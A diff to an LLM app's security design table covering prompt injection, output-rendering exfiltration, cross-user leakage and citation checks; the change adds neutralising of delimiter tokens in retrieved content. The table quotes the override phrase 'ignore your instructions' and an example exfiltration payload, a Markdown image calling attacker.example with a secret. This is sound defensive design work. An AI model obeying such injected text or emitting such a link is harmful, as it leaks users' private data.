@@ -64,7 +64,7 @@ Based on the OWASP Top 10 for LLM Applications, narrowed to what applies here.
 
 | Risk | Rule |
 |---|---|
-| **Prompt injection** (a source says "ignore your instructions…") | Instructions and untrusted content are strictly separated: system rules first, then clearly delimited context blocks, then the question. The system prompt states that context is data. The model has **no tools** and triggers **no actions** — worst case is a wrong answer, never a wrong action. |
+| **Prompt injection** (a source says "ignore your instructions…") | Instructions and untrusted content are strictly separated: system rules first, then clearly delimited context blocks, then the question. The system prompt states that context is data, and the delimiter is one a document cannot move: any delimiter token inside retrieved content or a source title is neutralised when the prompt is assembled (`lib/chat/prompts.ts`). The model has **no tools** and triggers **no actions** — worst case is a wrong answer, never a wrong action. |
 | **Data exfiltration via rendered output** | Model output is rendered as Markdown **without raw HTML and without images**. Links are allowed only for `http(s)`, open with `rel="noopener noreferrer nofollow"`. (An injected source could make the model emit `![](https://attacker.example/?q=<secret>)`; the browser would fetch it silently.) CSP `img-src` backs this up. |
 | **Cross-user leakage** | Retrieval always filters by `notebook_id` *and* runs through RLS (`security invoker`). A prompt only ever contains chunks the current user may read. |
 | **Unverified citations** | Citations are validated server-side against the chunks actually retrieved; invalid ones are dropped, never displayed. |
